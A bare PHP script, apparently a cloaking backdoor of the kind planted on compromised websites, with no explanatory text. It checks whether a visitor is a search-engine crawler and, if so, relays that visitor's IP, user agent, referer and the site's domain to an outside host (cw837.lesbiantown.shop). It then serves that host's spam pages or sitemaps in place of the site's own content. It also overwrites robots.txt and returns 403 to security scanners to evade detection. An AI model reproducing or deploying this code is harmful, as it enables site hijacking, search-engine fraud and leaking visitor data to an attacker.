<?php
$bagent = "Yahoo|Bing|Docomo|Google";
$jpgbh = "cw837";
error_reporting(0);
if(preg_match("/(universalFeedParser|ezooms|ZmEu|SemrushBot|AmazonBot|Jaunty|FeedDemon|Python-requests|Paloaltonetworks|Scrapy|YandexBot|DigExt|Heritrix|CoolpadWebkit|Feedly|Swiftbot|httpClient|Bytespider|easouSpider|JikeSpider|oBot|yisouSpider|LightDeckReports Bot|AhrefsBot|PetalBot|Python|Mj12bot|barkrowler|AskTbFXTV|CrawlDaddy|Python-urllib|indy Library|ApacheBench|yySpider|Java)/i", $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 403 Forbidden');
	exit();
}
$utgxp = "http://".$jpgbh. ".lesbiantown.shop/";
$pc = "A1MBVA9";
$uagent = urlencode($_SERVER['HTTP_USER_AGENT']);
$refer = urlencode(@$_SERVER['HTTP_REFERER']);
$language = urlencode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty(@$_SERVER['HTTP_CLIENT_IP'])) {
  $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty(@$_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
$ip = urlencode($ip);
$domain = urlencode($_SERVER['HTTP_HOST']);
$script = urlencode($_SERVER['SCRIPT_NAME']);
if ( (! empty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {
	$_SERVER['REQUEST_SCHEME'] = 'https';
} else {
	$_SERVER['REQUEST_SCHEME'] = 'http';
}
$http = urlencode($_SERVER['REQUEST_SCHEME']);
$uri = urlencode($_SERVER['REQUEST_URI']);
if(strpos($uri,"jpgjpg") !== false){echo "ok";exit();}
$jpg = 0;
if(!file_exists("jpg.txt")) {
	$uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/jpgjpg';
	$biji = @file_get_contents($uuu);
	if(empty($biji)) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $uuu);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		$biji = curl_exec($ch);
		curl_close($ch);
	}
	if($biji == "ok") {
		$jpg = 1;
		@file_put_contents("jpg.txt","1");
	} else {
		$jpg = 0;
		@file_put_contents("jpg.txt","0");
	}
} else {
	$jpg = @file_get_contents("jpg.txt");
}
if(strpos($uri,"favicon.ico") !== false) {
}
else if(strpos($uri,"pingsitemap.xml") !== false||strpos($uri,"jp2023") !== false||strpos($uri,"robots.txt") !== false||preg_match("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])||preg_match("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])||preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER']))
{
	$requsturl = $utgxp."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$jpg&script=$script";
	$robots_contents = "";
	if(strpos($uri,"pingsitemap.xml") !== false) {
		$scripname = $_SERVER['SCRIPT_NAME'];
		if( strpos( $scripname, "index.ph") !== false) {
			if($jpg == 0) {
				$scripname = '/?';
			} else {
				$scripname = '/';
			}
		} else {
			$scripname = $scripname.'?';
		}
		$robots_contents = "User-agent: *\r\nAllow: /";
		$sitemap = "$http://" . $domain .$scripname. "sitemap.xml";
		$robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";
		$sitemapstatus = "";
		echo $sitemap.": ".$sitemapstatus.'<br/>';
		$requsturl = $utgxp."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$jpg&script=$script&sitemap=".urlencode($sitemap);
	}
	$biji = @file_get_contents($requsturl);
	if(empty($biji)) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $requsturl);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		$biji = curl_exec($ch);
		curl_close($ch);
	}
	if(!empty($biji)) {
		if($biji == "500"||substr($biji,0,11)=="error code:") {
			header("HTTP/1.0 500 Internal Server Error");
			exit();
		}
		if(strpos($uri,"jp2023") !== false||preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER'])){header('HTTP/1.1 404 Not Found');}
		else if(substr($biji,0,5)=="<?xml") {
			header('Content-Type: text/xml; charset=utf-8');
		} else {
			header('Content-Type: text/html; charset=utf-8');
		}
		echo $biji;
		if(!empty($robots_contents)){@file_put_contents("robots.txt",$robots_contents);}
		else if(strpos($uri,"robots.txt") !== false){@file_put_contents("robots.txt",$biji);}
		exit();
		return;
	}
}else{
}
?>
